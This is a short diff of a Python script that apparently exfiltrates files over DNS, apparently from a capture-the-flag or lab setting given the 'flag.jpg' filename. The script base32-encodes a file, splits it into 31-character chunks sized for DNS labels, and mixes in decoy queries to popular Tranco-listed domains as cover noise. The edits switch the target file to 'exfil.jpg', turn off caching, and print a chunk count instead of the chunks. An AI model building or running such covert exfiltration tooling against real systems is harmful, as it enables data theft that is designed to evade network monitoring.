@@ -7,7 +7,7 @@ import os
 
 
 # Prepare random domains for DNS garbage
-t = Tranco(cache=True, cache_dir='.tranco')
+t = Tranco(cache=False)
 latest_list = t.list()
 top_1k = latest_list.top(10000)
 
@@ -23,7 +23,7 @@ def encode_data(filepath):
 
     encoded = base64.b32encode(binary_data).decode()
     chunks = [encoded[i:i+31] for i in range(0, len(encoded), 31)]
-    print(chunks)
+    print(f"There are {len(chunks)} chunks")
     return chunks
 
 def send_query(query):
@@ -44,5 +44,5 @@ def exfiltrate_data(data):
 # for i in range(0, 5):
 #     print(generate_garbage_query())
 
-filepath = './flag.jpg'
+filepath = './exfil.jpg'
 exfiltrate_data(filepath)
